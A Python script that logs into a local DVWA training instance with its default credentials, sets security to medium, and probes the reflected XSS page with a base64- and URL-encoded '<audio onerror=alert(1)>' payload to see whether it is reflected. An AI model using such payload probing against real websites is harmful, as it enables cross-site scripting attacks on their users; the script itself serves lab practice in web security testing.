# test_base64.py
import requests
from bs4 import BeautifulSoup
import base64
import urllib.parse

session = requests.Session()

# Login (same as before)
login_url = "http://localhost/dvwa/login.php"
r = session.get(login_url)
soup = BeautifulSoup(r.text, 'html.parser')
token = soup.find('input', {'name': 'user_token'})['value']

session.post(login_url, data={"username": "admin", "password": "password", "Login": "Login", "user_token": token})

security_url = "http://localhost/dvwa/security.php"
r = session.get(security_url)
soup = BeautifulSoup(r.text, 'html.parser')
token = soup.find('input', {'name': 'user_token'})['value']

session.post(security_url, data={"security": "medium", "seclev_submit": "Submit", "user_token": token})

# Test Base64
payload_plain = '<audio onerror="alert(1)">'
payload_base64 = base64.b64encode(payload_plain.encode()).decode()

print("="*70)
print("Testing Base64 Payload")
print("="*70)
print(f"Plain:  {payload_plain}")
print(f"Base64: {payload_base64}")

url = f"http://localhost/dvwa/vulnerabilities/xss_r/?name={payload_base64}"
r = session.get(url)

print(f"\nResponse contains plain:  {payload_plain in r.text}")
print(f"Response contains base64: {payload_base64 in r.text}")

if payload_base64 in r.text:
    pos = r.text.find(payload_base64)
    print(f"\nBase64 found at position {pos}")
    print(f"Context: ...{r.text[max(0, pos-50):pos+100]}...")

# URL encode the base64
payload_base64_urlencoded = urllib.parse.quote(payload_base64, safe='')
print(f"\nBase64 URL-encoded: {payload_base64_urlencoded}")

url2 = f"http://localhost/dvwa/vulnerabilities/xss_r/?name={payload_base64_urlencoded}"
r2 = session.get(url2)

print(f"Response contains base64: {payload_base64 in r2.text}")
print(f"Response contains base64 URL-encoded: {payload_base64_urlencoded in r2.text}")

if payload_base64 in r2.text or payload_base64_urlencoded in r2.text:
    print(f"\nBase64 IS reflected in response")
else:
    print(f"\nBase64 NOT reflected in response")
